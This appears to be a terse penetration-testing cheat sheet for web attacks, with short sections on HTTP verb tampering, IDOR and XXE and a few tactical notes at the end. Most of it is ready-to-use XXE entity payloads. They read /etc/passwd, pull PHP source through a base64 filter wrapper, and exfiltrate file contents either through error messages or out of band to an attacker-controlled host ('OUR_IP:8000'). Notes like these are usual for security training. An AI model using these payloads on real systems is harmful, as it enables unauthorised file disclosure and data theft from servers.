# Web Attacks

Goal: Exploit web logic flaws and parsing vulnerabilities.

---

# HTTP Verb Tampering

curl -X OPTIONS http://target

---

# IDOR

md5sum

base64

---

# XXE

<!ENTITY xxe SYSTEM "http://localhost/email.dtd">

<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">

<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

---

# Tactical Notes

- Test alternate HTTP verbs.
- Compare user roles for IDOR.
- Use base64 wrapper to read source.
- Use OOB for blind XXE.
